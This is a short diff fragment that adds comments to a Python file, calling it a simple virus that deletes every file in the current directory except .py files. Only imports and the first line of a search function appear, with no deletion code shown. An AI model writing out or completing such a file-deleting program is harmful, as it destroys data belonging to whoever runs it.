@@ -1,3 +1,6 @@
+#A simple virus program written in python that can delete all
+#files in the current working directory except .py files
+
 #!/usr/bin/python 
 import os, datetime, inspect 
 def search(path): #search for target files in path
